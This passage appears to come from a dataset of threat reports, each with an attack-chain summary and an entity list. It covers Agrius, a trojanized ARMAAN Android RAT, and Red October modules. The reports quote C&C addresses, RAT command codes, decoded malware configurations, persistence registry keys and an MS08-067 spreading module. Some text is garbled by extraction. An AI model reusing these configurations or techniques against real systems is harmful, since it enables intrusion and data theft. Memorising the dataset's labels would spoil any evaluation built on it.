3. Agrius used the stolen credentials with a custom tool called Sandals to connect to remote systems via SMB shares. 4. Sandals executed PsExec on the remote systems, launching a batch file similar to the one used by Apostle ransomware. 5. The batch file executed the Fantasy wiper malware. 6. The Fantasy wiper either overwritten every file on the system or selectively overwritten files with extensions from a list of 682 file types. 7. Through the compromised Israeli software developer, Agrius distributed the Fantasy wiper via a supply-chain attack. 8. ESET researchers analyzed the attack but have not disclosed which specific Israeli software company was compromised. 9. ESET published an indicator of compromise report on GitHub from their investigation. ",valid_90,"['Agrius', 'an Israeli software developer', 'credentials', 'MiniDump', ' Mimikatz', 'SecretsDump', 'a custom tool', 'Sandals', 'remote systems', 'SMB shares', 'PsExec', 'a batch file', 'Apostle', 'the batch file', 'the Fantasy', 'every file', 'files', 'extensions', 'a list', '682', 'a supply-chain attack', 'ESET researchers', 'GitHub']",Agrius; an Israeli software developer; credentials; MiniDump;  Mimikatz; SecretsDump; a custom tool; Sandals; remote systems; SMB shares; PsExec; a batch file; Apostle; the batch file; the Fantasy; every file; files; extensions; a list; 682; a supply-chain attack; ESET researchers; GitHub.
"Indian Army Personnel Face Remote Access Trojan Attacksblog.cyble.com/2022/01/28/indian-army-personnel-face-remote-access-trojan-attacks/January 28, 2022Cyble Research Labs has come across a Twitter post wherein security researchers have brought to focus an Android malware that pretends to be the legitimate ARMAAN application. The Army Mobile Aadhaar App Network (ARMAAN) is an umbrella application covering various facets of information & services concerning all ranks of the Indian Army, and the app is used only by Indian Army personnel. Threat Actors (TAs) have customized the legitimate ARMAAN app and added malicious code into it.During our analysis, we observed that this malicious application uses the icon, name, and even source code of the legitimate ARMAAN app. To create this malicious application, attackers have added an extra package in the legitimate application’s source code to enable it to perform RAT activities.From our analysis, we concluded that upon successful execution, this malicious application could steal sensitive data such as contacts, call logs, SMSes, location, files from external storage, record audio, etc., from the victims’ devices.Technical Analysis APK Metadata InformationApp Name: ARMAAN Package Name: in.gov.armaan shown in the figure below.Figure 2 – App Icon and Name2/10Figure 3 – App Requests KYC DocumentsWhen the user inputs the AADHAAR number, the malware communicates with the official ARMAAN server to verify the account, as shown below.Figure 4 – App Communicates to Legitimate ServerOn comparing the legitimate ARMAAN application and the modified malicious ARMAAN application, we identified that the TAs have added an extra package containing malicious code, as shown in the figure below.3/10Figure 5 – Added Source Code Package in Malicious AppManifest Description The malware requests the user for 22 different permissions. Out of these, it abuses ten permissions. These dangerous permissions are listed below.PermissionsREAD_SMSRECEIVE_SMSREAD_CALL_LOGREAD_CONTACTSREAD_PHONE_STATERECORD_AUDIOACCESS_COARSE_LOCATIONACCESS_FINE_LOCATIONDescriptionAccess SMSes in the device database (DB).Intercept SMSes received on the victim’s deviceAccess Call LogsAccess phone contacts.Allows access to phone state, including the current cellular network information, the phone number and the serial number of the phone, the status of any ongoing calls, and a list of any Phone Accounts registered on the device.Allows the app to record audio with the microphone, which the attackers can misuse.Allows the app to get the approximate location of the device network sources such as cell towers and Wi-Fi.Allows the app to get the device’s precise location using the Global Positioning System (GPS).ACCESS_BACKGROUND_LOCATION Allows an app to access location in the background.ACCESS_WIFI_STATEAllows the app to get information about Wi-Fi connectivity.We observed added services and receivers entries in the manifest file of the malicious app, as shown in Figure 6.4/10Figure 6 – Added Entries in ManifestIt is also observed in the manifest that the TAs have added dangerous permissions entries such as READ_CONTACTS, READ_CALL_LOG, RECORD_AUDIO, ACCESS_COARSE_LOCATION, etc. in modified malicious ARMAAN applications.Figure 7 – Added Permissions Entry in Malicious APPSource Code Review Our static analysis indicated that the malware steals sensitive data such as Contacts, SMSes, and Call logs, besides recording audio and taking pictures from the camera, etc., on commands from the C&C.The malware uses a fixed hardcoded array containing the IP’s ASCII values: 173[.]212.220.230 and port: 3617 Details. The malware then converts and uses them for its C&C communication, as shown in Figure 8.5/10Figure 8 – Malware CommunicationThe getAlluserInfo() method has been used to collect the user’s device information such as phone number, device manufacturer’s details, etc., from the device, as shown in Figure 9.Figure 9 – Collects User’s InformationThrough the getAllSMS() method, we identified that the malware collects SMSs data from the device, as shown in the below figure.6/10The method getAllContacts() has been used to collect Contacts data from the device, as shown below.Figure 10 – Code to Collect SMSsFigure 11 – Code to Collect Contacts DataMethod getAllCallLogs() depicts the malware’s ability to collect Call logs data from the device. Refer to Figure 12.Figure 12 – Code to Collect Call logsThe code snippet shown in the below image depicts the malware’s ability to collect the device’s location data from the device.Figure 13 – Collects Location Data from the DeviceThe image shown below showcases the malware’s code that collects and sends images from the WhatsApp directory in the device to the server on commands from the TAs.Figure 14 – Steals Images from WhatsApp Directory7/10The method sentMicRecording() shown in the below image depicts the malware’s ability to record mic and send the recorded data to the server on the TAs command. After the data is sent, the malware deletes the file.The below figure represents the malware’s ability to capture images from the front and back camera and send the recorded data to the server on the TAs command.Figure 15 – Records MicFigure 16 – Capture Images from Front and Back CameraThe malware collects the document files from the device through the remainingDocumentFiles() method shown in the figure below.Below are the commands used by the TA to control the infected device:Figure 17 – Code to Collect Document Files8/10Command DescriptionD%r6t*Get SMS datas%7n@2Get Contacts datai*g4#3Get Call logs dataO@y7J&Start mic recording5w$I!71^R$4tj*7e@4Get document filesGet images from the WhatsApp folderClick photos from the device cameraA website with the domain name hxxps://armaanapp[.]in was registered around a year ago. It seems that TAs used this website to deliver malicious versions of the ARMAAN application, as shown in the below figure below.Figure 18 – Fake WebsiteConclusion The modified, malicious ARMAAN app poses a serious threat to the Indian Armed Forces. It can perform RAT activities with the potential to steal Indian Army personnel’s sensitive data, including contacts, call logs, SMSes, Location, and files from external storage, in addition to the ability to record sensitive audio.TAs constantly adapt their methods to avoid detection and find new ways to target users through increasingly sophisticated techniques. Such malicious applications often masquerade as legitimate applications to trick users into installing them. This situation makes it imperative for users to install applications only after verifying their authenticity. Apps should only be installed exclusively via the official Google Play Store and other trusted portals to avoid such attacks.Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below:How to prevent malware infection?Download and install software only from official app stores like Google Play Store or the iOS App Store. Use a reputed anti-virus and internet security software package on your connected devices, such as PCs, laptops, and mobile devices. Use strong passwords and enforce multi-factor authentication wherever possible. Enable biometric security features such as fingerprint or facial recognition for unlocking the mobile device where possible. Be wary of opening any links received via SMS or emails delivered to your phone. Ensure that Google Play Protect is enabled on Android devices. Be careful while enabling any permissions. Keep your devices, operating systems, and applications updated.9/10How to identify whether you are infected?Regularly check the Mobile/Wi-Fi data usage of applications installed in mobile devices. Keep an eye on the alerts provided by Anti-viruses and Android OS and take necessary actions accordingly.What to do when you are infected?Disable Wi-Fi/Mobile data and remove SIM card – as in some cases, the malware can re-enable the Mobile Data. Perform a factory reset. Remove the application in case a factory reset is not possible. Take a backup of personal media Files (excluding mobile applications) and perform a device reset.What to do in case of any fraudulent transaction?In case of a fraudulent transaction, immediately report it to the concerned bank.What should banks do to protect their customers?Banks and other financial entities should educate customers on safeguarding themselves from malware attacks via telephone, SMSes, or emails.MITRE ATT&CK® TechniquesTacticInitial AccessInitial AccessExecutionCollectionCollectionCollectionCollectionCollectionCollectionCollectionTechnique ID Technique NameT1476T1444T1575T1433T1412T1432T1429T1512T1533T1430Deliver Malicious App via Other Mean.Masquerade as Legitimate ApplicationNative CodeAccess Call LogCapture SMS MessagesAccess Contact ListCapture AudioCapture CameraData from Local SystemLocation TrackingCommand and Control T1436Commonly Used PortsIndicators of Compromise (IOCs)IndicatorsIndicator ","1. Initial Access - The malware disguises itself as the legitimate ARMAAN app targeting Indian Army personnel. - It is distributed outside the official app stores to trick users into installing it. 2. Execution - Upon installation, the malware loads its malicious components from the added code package. - It establishes communication with the hardcoded command and control server. 3. Command and Control - The malware receives commands from the C&C server to perform various malicious activities. 4. Data Exfiltration - It exfiltrates sensitive data like SMS, contacts, call logs, files, images, location, etc. to the C&C server. 5. Additional Malicious Actions - It can record audio, take photos, and steal WhatsApp images based on commands from the C&C server. 6. Persistence - The malware can continue to operate and accept new commands from the C&C server. ",valid_69,"['access', 'the malware', 'the legitimate ARMAAN app', 'Indian Army personnel', 'official app stores', 'users', 'Code', 'communication', 'Control', 'commands', 'C&C', 'sensitive data', 'SMS', 'Contacts', 'Call logs', 'Files', 'images', 'location', 'addition', 'record audio', 'photos', 'WhatsApp', 'ten']",access; the malware; the legitimate ARMAAN app; Indian Army personnel; official app stores; users; Code; communication; Control; commands; C&C; sensitive data; SMS; Contacts; Call logs; Files; images; location; addition; record audio; photos; WhatsApp; ten.
"“Red October”. Detailed Malware Description 4. Second Stage of Attacksecurelist.com/red-october-detailed-malware-description-4-second-stage-of-attack/36884/By GReATFirst stage of attack1. Exploits 2. Dropper 3. Loader Module 4. Main componentSecond stage of attack 1. Modules, general overview 2. Recon group 3. Password group 4. Email group 5. USB drive group 6. Keyboard group 7. Persistence group 8. Spreading group 9. Mobile group 10. Exfiltration group7. Persistence groupScheduler moduleKnown locations: %APPDATA%MicrosoftRtkN32Gdi.exeThe module is created and executed (for the first time) by the module “fileputexec”.Known variants:MD5Compilation date(encrypted)43C0BA45BE45CA20ED014A8298104716 2012.10.24 13:12:43 (GMT)Compilation date (payload)2012.10.11 07:19:12 (GMT),SummaryThe file is a PE EXE file, compiled with Microsoft Visual Studio 2010.Creates encrypted log files: “%TMP%smrdprevsmrdprev_%p_%p.tmp”, where “%p” parameters are formatted from the return values of subsequent GetTickCount API calls.Creates event: “Globalwsheledstpknt”1/25Creates mutex: “NtWinWMIctlshed”When started, the module initializes its log object with a new filename. Then, it creates one of the following registry values to ensure its automatic start:HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesExplorerRunservise=%path to the module’s executable file%HKCUSoftwareMicrosoftWindows NTCurrentVersionWindowsload=%path to the module’s executable file%Then, the module enters an infinite loop where it executes its main function with 300 second delay between iterations.Main functionThe module traverses the directories from a hardcoded list, looking for files with names matching regular expressions “.* *.bak” and “.* *.trh”. The list of directories:%ProgramFiles%Microsoft Common %ProgramFiles%Common Files %SystemDrive%Documents and SettingsLocalServiceApplication DataMicrosoft %SystemDrive%Documents and SettingsLocalServiceLocal SettingsApplication DataMicrosoft %ALLUSERSPROFILE% %ALLUSERSPROFILE%Application Data %ALLUSERSPROFILE%Application DataMicrosoft %ALLUSERSPROFILE%Application DataMicrosoftOffice %ALLUSERSPROFILE%Application DataMicrosoftOfficeData %ALLUSERSPROFILE%Application DataMicrosoftWindows %HOMEPATH%Local Settings %module’s installation directory%Any found file with the extension “.trh” is deleted.Files with the extension “.bak” are treated differently. They are decrypted using a custom AMPRNG algorithm with a hardcoded key, then decompressed using LZMA. If the file was decompressed without errors, it is expected to start with a header that describes an internal task.2/25Each task has a name and a “type” field. Depending on that field, the module treats the contents of the decrypted file differently:Task type134Task actionThe task is a PE EXE file. It is written to a temporary file ‘%TMP%%number%.exe‘ and executed with CreateProcess API. The file is removed when the process terminates.The task is a PE DLL file. It is loaded in memory with a custom PE loader. Then, its export named ‘START‘ is called.The task is a new version of the ‘scheduler’ module. The original module is moved to a file with extension ‘.trh‘ and deleted, the task’s contents are written instead.Known variants of the “.bak” task files were created by the “fileputexec” module. They all contained a task named “fileinfo”.DocBackdoor (Acrobat Reader and Microsoft Office plugin) moduleKnown file locations: add-on directories of Acrobat Reader or Microsoft Office, depends on The malware contains a universal plugin for Acrobat Reader and Microsoft Office application. The plugin does not depend on the application so it could have been used with other applications, too.Export(s): winampGetGeneralPurposePluginAll the functionality is implemented in the DllMain function.DllMain functionWhen loaded, the module starts a new thread and returns. In the new thread, the module executes its main function in an infinite loop, with 1 second delay.Main functionThe module iterates through file handle values from 0 to 65534 with step 4, and tries to get file size for every handle. If call to GetFileSize succeeds, the module assumes that it found a valid file handle, and proceeds with this file. The file handle may belong to any file that is currently open by the application, including any open documents (i.e. PDF, DOC, XLS, PPT files).The module retrieves the name of the file, reads the whole file into memory and checks its last DWORD. If the value is not equal to the magic number 0x29A (666 decimal), it skips this file. If the DWORD matches the magic value, it reads more values from the end of file.Offset from the end of fileTypeDescription3/25-4-5-9DWORDBYTEDWORDMagic number 0x29AOperation mode bytePayload length-9 – Payload lengthBYTE*payload length Encrypted payloadIf the operation mode byte is equal to 3, the module loads the decrypted payload as a PE DLL library using own PE format loader, and executes its DllMain function. If the operation mode byte contains any other value, it tries to write the payload to the first available directory from the list:%windir%Temp %ProgramFiles%Common Files %ProgramFiles%WindowsUpdateThe name of the file is read from the beginning of the decrypted payload.Then, the module selects further actions depending on the operation mode byte:Operation mode byte valueAction12Execute the file with CreateProcessLoad the file with LoadLibraryOfficeBDInstaller module (Microsoft Office plugin installer)Known variants:MD5Compilation date (payload)AE693C43E40F0DE9DE9FA2D950003ABF2012.10.09 06:42:11 (GMT)The file is a PE DLL file without exported functions, compiled with Microsoft Visual Studio 2010. All the functionality is implemented in the DllMain function.DllMainWhen loaded, the module retrieves its resource of type “BBB” and name “AAA”, and starts an internal plugin framework. The main function of the module is named “task_msplugin” and is registered in the framework. Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.The decoded resource data for the known sample can be represented as the following script:SetOption(conn_a.VERSION_ID, [6] “51070”) SetOption(conn_a.VER_SESSION_ID, %removed%) SetOption(conn_a.SEND_DELAY_TIME, [5] “2000”) SetOption(conn_a.D_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.D_MODE, “3”) SetOption(conn_a.D_NAME, [15] “/cgi-bin/nt/sk”)4/25SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.D_RPRT, [3] “80”) SetOption(conn_a.D_SPRT, [3] “80”) SetOption(conn_a.D_USER, [21] %removed%) SetOption(conn_a.J_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_NAME, [15] “/cgi-bin/nt/th”) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.J_RPRT, [3] “80”) SetOption(conn_a.J_SPRT, [3] “80”) SetOption(conn_a.J_USER, [21] %removed%) SetOption(msplugin_loc, 76288 bytes buffer) SetOption(msplugin_name, 28 bytes buffer) SetOption(msplugin_Word, “1”) SetOption(msplugin_Excel, “0”) SetOption(msplugin_PowerPoint, “0”) SetOption(msplugin_desc0, 38 bytes buffer) SetOption(msplugin_desc1, 58 bytes buffer) SetOption(msplugin_desc2, 64 bytes buffer) SetOption(msplugin_progid, 22 bytes buffer) Call(task_msplugin)Main function (task_msplugin)First, the module tries to raise its privileges. It tries to log in as a privileged user using a dictionary of common passwords. Then, it tries to locate installed Microsoft Office application by enumerating the registry keys in HKLMSOFTWAREMicrosoftWindowsCurrentVersionUninstall and searching for the keys that contain “Microsoft Office”, “Microsoft Office Word”, “Microsoft Office Shared” in the “DisplayName” value. If no key was found, the module aborts installation.Then, depending on the values of the options “msplugin_Word”, “msplugin_Excel”, “msplugin_PowerPoint”, it installs a plugin for selected Office applications. For each application, it tries to write the plugin to the first available directory from the list:%ProgramFiles%Microsoft OfficeOffice10Data %ProgramFiles%Microsoft OfficeOffice10 %ProgramFiles%Microsoft OfficeOffice11Data %ProgramFiles%Microsoft OfficeOffice11 %ProgramFiles%Microsoft OfficeOffice12Data %ProgramFiles%Microsoft OfficeOffice12 %ALLUSERSPROFILE%Application DataMicrosoftOffice %ALLUSERSPROFILE%Application DataMicrosoftOfficeData %ProgramFiles%Microsoft Common %ProgramFiles%Common FilesThe file name for the plugin is retrieved from the “msplugin_name” option from the resource. It also generates a random CLSID value for the plugin.5/25If the file was created without errors, the module creates the following registry values:HKLMSOFTWAREMicrosoftOffice%product name%Addins%msplugin_progid option value% LoadBehavior=DWORD:0x10 CommandLineSafe=DWORD:0x00 FriendlyName=%msplugin_desc1 option value% Description=%msplugin_desc2 option value%HKCRCLSID%plugin’s CLSID% default=%msplugin_desc0 option value%HKCRCLSID%plugin’s CLSID%InProcServer32 default=%plugin installation path%HKCRCLSID%plugin’s CLSID%ProgID default=%msplugin_progid option value%HKCRCLSID%plugin’s CLSID%VersionIndependentProgID default=%msplugin_progid option value%HKCR%msplugin_progid option value%CLSID default=%plugin’s CLSID%After completing the installation, the module sends its log file to the C&C server. The connection options are retrieved from the configuration (resource):Option nameD_CONNDescriptionList of C&C domain names, separated by ‘;’D_RPRTC&C server portD_NAMERelative URL to send request toThe data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP All the functionality is implemented in the DllMain function.DllMain functionWhen loaded, the module retrieves its resource of type “BBB” and name “AAA”, and starts an internal plugin framework. The main function of the module is named “task_arplugin” and is registered in the framework. Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.6/25The decoded resource data for the known sample can be represented as the following script:SetOption(conn_a.VERSION_ID, [6] “51070”) SetOption(conn_a.VER_SESSION_ID, %removed%) SetOption(conn_a.SEND_DELAY_TIME, [5] “2000”) SetOption(conn_a.D_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_NAME, [15] “/cgi-bin/nt/sk”) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.D_RPRT, [3] “80”) SetOption(conn_a.D_SPRT, [3] “80”) SetOption(conn_a.D_USER, [21] %removed% ) SetOption(conn_a.J_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_NAME, [15] “/cgi-bin/nt/th”) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.J_RPRT, [3] “80”) SetOption(conn_a.J_SPRT, [3] “80”) SetOption(conn_a.J_USER, [21] %removed% ) SetOption(arplugin_loc, 76288 bytes buffer ) SetOption(arplugin_name, 28 bytes buffer ) Call(task_arplugin)Main function (task_arplugin)The module retrieves the Adobe Reader installation path by reading the registry value:HKLMSOFTWAREClassesSoftwareAdobeAcrobatExe@defaultThen, it tries to identify the version of installed software by searching for strings “10.0”, “9.0”, “8.0” in the installation path. If none of them are found, it aborts installation with error.If installation path contains the string “10.0”, the module tries to open the existing registry key:HKCUSOFTWAREAdobeAcrobat Reader10.0If the key exists, then writes “Privileged=’ON'” into its log and sets the following registry key, effectively disabling the “protected mode” of the Adobe Reader:HKCUSOFTWAREAdobeAcrobat Reader10.0PrivilegedbProtectedMode=0Then, the module extracts the Acrobat Reader plugin body from the configuration option “arplugin_loc” (specified in the resource) and writes it to:%acrobat reader installation path%plug_ins%arplugin_rem option value%It also retrieves the last write time of the plug_ins directory and sets the plugin’s last write time to the same value.After completing the installation, the module sends its log file to the C&C server. The connection options are retrieved from the configuration (resource):7/25Option nameD_CONNDescriptionList of C&C domain names, separated by ‘;’D_RPRTC&C server portD_NAMERelative URL to send request toThe data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP stream cipher, and then it is Base64-encoded.8. Spreading groupFileputexec moduleKnown variants:MD5Compilation date (payload)6FE7EB4E59448E197BDFAE87247F3AE62012.09.06 07:55:31 (GMT)ED5FF814B10ED25946623A7EC2C0A682 2012.09.06 07:55:31 (GMT)37B443893551C1537D00FD247E3C9A782012.09.06 07:55:31 (GMT)SummaryThe file is a PE DLL file without exported functions, compiled with Microsoft Visual Studio 2010. Known samples share one code section, but contain different payloads in the resource section. All the functionality is implemented in the DllMain function. It writes files from its configuration resource to disk and starts a new process from these file(s).DllMainWhen loaded, the module retrieves its resource of type “BBB” and name “AAA”, and starts an internal plugin framework. The main function of the module is named “task_fileputexec” and is registered in the framework. Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.Decoded resource data for the module can be represented as the following script:SetOption(conn_a.VERSION_ID, [6] “51070”) SetOption(conn_a.VER_SESSION_ID, %removed%) SetOption(conn_a.SEND_DELAY_TIME, [5] “2000”) SetOption(conn_a.D_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_NAME, [15] “/cgi-bin/nt/sk”) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.D_RPRT, [3] “80”) SetOption(conn_a.D_SPRT, [3] “80”) SetOption(conn_a.D_USER, [21] %removed%) SetOption(conn_a.J_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”)8/25SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_NAME, [15] “/cgi-bin/nt/th”) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.J_RPRT, [3] “80”) SetOption(conn_a.J_SPRT, [3] “80”) SetOption(conn_a.J_USER, [21] %removed%) SetOption(file_loc, 156898 bytes buffer ) SetOption(file_rem, 100 bytes buffer ) Call(task_fileputexec)Main function (task_fileputexec)The module implements two distinct functions:It writes files from its configuration resource to disk It starts executable files specified in the resourceFirst, the module looks for pairs of configuration options called “file_rem” and “file_loc”. The module iterates through all “file_rem” options, reads the corresponding “file_loc” value and writes the contents of the latter option to disk, using the value of “file_rem” as a filename.The “file_rem” value can specify a location at another computer’s network share. In this case the module tries to log onto that share using credentials specified in an encrypted configuration file that may be located at:%ALLUSERSPROFILE%adt.dat %LOCALAPPDATA%adt.datKnown variants of the module were used to write another module called “scheduler” and additional files for this module.After processing all “file_rem” and “file_loc” options, the module iterates through all values of the “file_exec_rem” option. Each value is expected to be an applications path, and each application is executed using the CreateProcess API function.After processing all the configuration options, the module sends its log file to the C&C server. The connection options are retrieved from the configuration (resource):Option nameD_CONNDescriptionList of C&C domain names, separated by ‘;’D_RPRTC&C server portD_NAMERelative URL to send request toThe data sent to the C&C server is compressed with Zlib and encrypted with a modified PKZIP All the functionality is implemented in the DllMain function.Once it is loaded it was designed to start scanning other hosts in the network and record responses. It would do several probes for remote vulnerabilities, such as MS08-067. It is capable of dumping current configuration of Cisco routers if they are available via SNMP and the scanner successfully guessed the SNMP community name.This module loads a config from local resource AAA and executes a network scanning task.Loading procedureDue a design made by the developer usage of this module is limited. It seems that it was developed and tested as an EXE file, however in the release version it was compiled as a DLL. This change was extremely significant for the whole functionality which creates a number of worker threads right in the main function, which is would be fine for EXE module WinMain function, but is restrcited for library DllMain function. This broke down the module as it created threads which couldn’t run when DLL is loaded via LoadLibrary API. However, it’s important to note that the developers implemented own PE loader, which doesn’t have such limitation as Window native PE loader, and which is why it can still be used as a component of malicious kit.DllMain functionCurrent sample has the following embedded config:SetOption(conn_a.D_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.D_NAME, [15] “/cgi-bin/nt/sk”) SetOption(conn_a.D_RPRT, [3] “80”) SetOption(conn_a.D_SPRT, [3] “80”) SetOption(conn_a.D_USER, [21] “%removed%”) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.J_CONN, [65] “nt-windows-online.com;nt-windows-update.com;nt-windows- check.com”) SetOption(conn_a.J_NAME, [15] “/cgi-bin/nt/th”) SetOption(conn_a.J_USER, [21] “%removed%”) SetOption(conn_a.J_RPRT, [3] “80”) SetOption(conn_a.J_SPRT, [3] “80”) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.VERSION_ID, [6] “51070”) SetOption(conn_a.SEND_DELAY_TIME, [6] “20000”)10/25SetOption(conn_a.VER_SESSION_ID, [11] “%removed%”) SetOption(netscan_get_NET, “1”) SetOption(netscan_get_net_ad, “1”) SetOption(netscan_get_net_msnet, “1”) SetOption(netscan_get_net_msdom, “1”) SetOption(netscan_threads_num, [3] “64”) SetOption(netscan_tcpscanwinsrv, “1”) SetOption(netscan_tcpscanwin, “0”) SetOption(netscan_tcpscannotwin, “0”) Call(task_netscan)The target networks to scan are selected automatically and include the following lists:1. specified in the config NET variable if netscan_get_NET is set to 1 2. subnets of IPs which are visible from adapters config via GetAdaptersInfo API (current IP,gateway, DHCP, WINS servers)3. subnets of IPs which are visible in the list of currently mapped shared folders 4. subnets of IPs which are part of current Microsoft Windows domain as reported by theDomain ControllerScanning procedureThe scan begins with pinging the target with 2 seconds timeout. Then the scanner gets target hostname and MAC address. After that it tries to send an SNMPv3 request. Unlike SNMPv2, SNMPv3 responds even if the username is wrong allowing you to identify if the port is open or not. If the remote SNMP agent responds, then the scanner will try to talk further.SNMP packet from malware in WiresharkIt tries to guess the SNMP agent community name from a list of 600 hardcoded variants. The list itself interesting enough as it seems to be made of previously discovered SNMP agent community names from various locations where the attackers managed to penetrate networks.We are sharing the list, maybe it will help someone identify his SNMP community name and will write-access is available. Then it fetches SNMP SysDescription property.Interestingly, when the module finds a Cisco snmp agent, it starts own TFTP server and transfers Cisco device configuration via TFTP.CISCO configuration dumper function call graphNext it checks host for SIP service. That is accomplished by sending OPTIONS request to the remote host on port 5060 from hardcoded source port 11122:OPTIONS sip:smap@localhost SIP/2.0 Via: SIP/2.0/UDP %Local IP%:11122;branch=z9hG4bK.51125;rport;alias From: ;tag=3a539be23b6269ec To: sip:IPPhone@localhost Call-ID: 1638708638@%Local IP% CSeq: 3471 OPTIONS Contact: Content-Length: 0 Max-Forwards: 70 User-Agent: IPPhone 0.67 Accept: text/plain16/25The module simply saves SIP server response to a log file and goes to the next stage.Next it tries to work with NetBIOS (SMB) protocol of the remote target, the code includes full own implementation of the protocol negotiatiation and communication with the remote host. The module establishes SMB NULL session, which doesn’t require authentication and sends further queries.The scanning module connects to LLSRPC pipe, which is used to be available via SMB NULL session on Windows 2000 before SP4. If the attacker connects to Microsoft Windows 2000 Server-based system through a null session, it is possible to use the Llsrpc named pipe to add or to delete licenses, and to create new license groups. However, availability of LLSRPC pipe is checked only to detect the remote OS Service Pack version. There are few other methods in the code that provide reliable detection of Service Pack 1,2,3 of Windows 2000.Next step is to detect remote OS default language. That is accomplished by connecting to Spoolss pipe and querying the name of the service. The response is normally sent in system default language, which is detected by the module. Here is a list of languages, which might indicate which systems attackers are interested in (hardcoded in the malware):UNKNOWN EnglishSpanishItalianFrenchGermanPortuguese – BrazilianPortugueseHungarianFinnishSwedishPolishDutchCzechDanishTurkishJapaneseChinese Traditional Chinese Traditional – Taiwan KoreanRussianSo far, the module collects the following information over SMB:Target Name NetBIOS Domain Name NetBIOS Computer Name DNS Domain Name DNS Computer Name OS Major Version Number OS Minor Version Number OS Build OS Language ID OS Version (alternative detection method) OS Language (alternative detection method)The module has another unique feature, it checks if the system is vulnerable for MS08-067 vulnerability. It creates a path, part of which includes a unique string “ spider3” which we haven’t seen previously. The module is capable of constructing tcpbind shellcode for different versions of remote OS to check if the exploit works.There is a portscanner in the module, and it checks ports from the embedded list:17/2522, 23, 53, 80, 110, 143, 156, 456, 912, 990, 993, 995, 1043, 1194, 1352, 1433, 2481, 3306, 5432, 8080, 8800While most of the ports look standard, some of them are not very common. We decided to investigate which services are running on those ports.156 is some SQL Server port, however we don’t know any software running on port 156 456 is probably a typo of 465 – SMTP over SSL 912 is for VMWare Authorization Service 990 is used by FTPS 995 is for POP3S 1043 can be used by BOINC software or Microsoft IIS 1194 is a standard port for OpenVPN 1352 Lotus Notes/Domino RPC 1433 MS SQL Server 2481 Oracle Server 3306 MySQL Server 5432 PostgreSQL 8080 HTTP (alternate) 8800 HTTP (SunWebAdmin)If ports 80 or 8080 are open, then the module sends simple HTTP request to test if the remote webserver is available and if it is running MS Excahnge server. MS Exchange is probed with the following HTTP request:GET /ews/exchange.asmx HTTP/1.0Collected information and logs are never saved to a file on disk, instead it is compressed using vulnerability referred as MS08-067. It checks remote OS version, locale, SP version, crafts a packet with exploit code and pushes to the target. It injects an executable payload, which drops another module known as “Frog” (full description of Frog is available in a separate chapter). The later is a backdoor component which provides capability to run arbitrary executable on the remote target.DllMain function18/25When loaded, the module retrieves its resource of type “BBB” and name “AAA”, and starts an internal plugin framework. The main function of the module is named “task_msexploit” and is registered in the framework. Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.The decoded resource data for the known sample can be represented as the following script:SetOption(conn_a.VERSION_ID, [6] “11997”) SetOption(conn_a.VER_SESSION_ID, %removed%) SetOption(conn_a.SEND_DELAY_TIME, [5] “2000”) SetOption(conn_a.D_CONN, [60] “microsoftosupdate.com;microsoft- msdn.com;microsoftcheck.com”) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_NAME, [18] “/cgi-bin/ms/flush”) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.D_RPRT, [3] “80”) SetOption(conn_a.D_SPRT, [3] “80”) SetOption(conn_a.D_USER, [21] “%removed%”) SetOption(conn_a.J_CONN, [60] “microsoftosupdate.com;microsoft- msdn.com;microsoftcheck.com”) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_NAME, [18] “/cgi-bin/ms/check”) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.J_RPRT, [3] “80”) SetOption(conn_a.J_SPRT, [3] “80”) SetOption(conn_a.J_USER, [21] “%removed%”) SetOption(msexploit_loc, 147456 bytes PE file ) SetOption(msexploit_ip) SetOption(msexploit_ip, [16] “%Target IP%”) Call(task_msexploit)Main function (task_msexploit)The config defines parameters for the method task_msexploit, which includes the following:msexploit_loc – a payload to be pushed if exploit worked successfully; msexploit_ip – an array of IPs to attack.Then the module gets local proxy settings, starting from MS Internet Explorer settings, then parsing Opera profile files (if exist) and finally getting proxy settings from quite suspicious registry keys:HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrps HKLMSoftwareWow6432NodeMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrpsIt seems that MapMenuConfigGrps registry value doesn’t exist on standard Windows system. We suspect that this registry key is set by a malicious module during operation and is used to store proxy server parameters.19/25After that, the module attempts to find %AppData%adt.dat. Two variants are checked – common and user-specific, i.e.:C:Documents and SettingsAll UsersApplication Data C:Documents and SettingsusernameApplication 